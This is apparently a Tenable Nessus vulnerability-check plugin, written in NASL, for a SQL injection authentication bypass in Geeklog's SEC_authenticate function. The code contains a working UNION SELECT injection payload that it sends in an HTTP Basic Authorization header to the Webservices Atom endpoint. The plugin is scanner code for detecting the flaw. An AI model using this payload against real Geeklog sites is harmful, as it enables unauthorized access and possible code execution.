#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(36144);
  script_version("$Revision: 1.11 $");
  script_cvs_date("$Date: 2015/09/24 21:08:39 $");

  script_bugtraq_id(34456);
  script_osvdb_id(53594);
  script_xref(name:"EDB-ID", value:"8376");

  script_name(english:"Geeklog SEC_authenticate Function SQL Injection");
  script_summary(english:"Tries to bypass authentication");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is prone to a SQL
injection attack.");
  script_set_attribute(attribute:"description", value:
"The version of Geeklog installed on the remote host fails to sanitize
input to the 'username' argument of the 'SEC_authenticate' function in
'/system/lib-security.php' before using it to construct database
queries.  Regardless of PHP's 'magic_quotes_gpc' setting, an
unauthenticated attacker can exploit this issue to manipulate database
queries to, for example, bypass authentication and gain access to
dangerous functions, which in turn could allow for arbitrary code
execution.");
  script_set_attribute(attribute:"see_also", value:"http://www.geeklog.net/article.php/webservices-exploit");
  script_set_attribute(attribute:"solution", value:"Configure Geeklog to disable Webservices.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"plugin_publication_date", value:"2009/04/13");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:geeklog:geeklog");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2009-2015 Tenable Network Security, Inc.");

  script_dependencies("geeklog_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/geeklog");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);


password = SCRIPT_NAME;
exploit = string(
  "' AND 0 UNION SELECT 3,MD5('", password, "'),null,2 LIMIT 1 -- "
);



# Test an install.
install = get_kb_item(string("www/", port, "/geeklog"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];

  # Try to exploit the issue to bypass authentication.
  url = string(dir, "/webservices/atom/index.php?introspection");

  req = http_mk_get_req(
    port        : port,
    item        : url, 
    add_headers : make_array(
      'Authorization',
      string('Basic ', base64(str:exploit+":"+password))
    )
  );
  res = http_send_recv_req(port:port, req:req);
  if (isnull(res)) exit(0);

  # There's a problem if we've bypassed authentication.
  if (
    '<app:service' >< res[2] &&
    '?plugin=staticpages">' >< res[2]
  )
  {
    if (report_verbosity > 0)
    {
      req_str = http_mk_buffer_from_req(req:req);

      report = string(
        "\n",
        "Nessus was able to verify the vulnerability exists using the following\n",
        "request :\n",
        "\n",
        crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n",
        req_str, "\n",
        crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n"
      );
      security_hole(port:port, extra:report);
    }
    else security_hole(port);

    set_kb_item(name:'www/'+port+'/SQLInjection', value:TRUE);
    exit(0);
  }
}
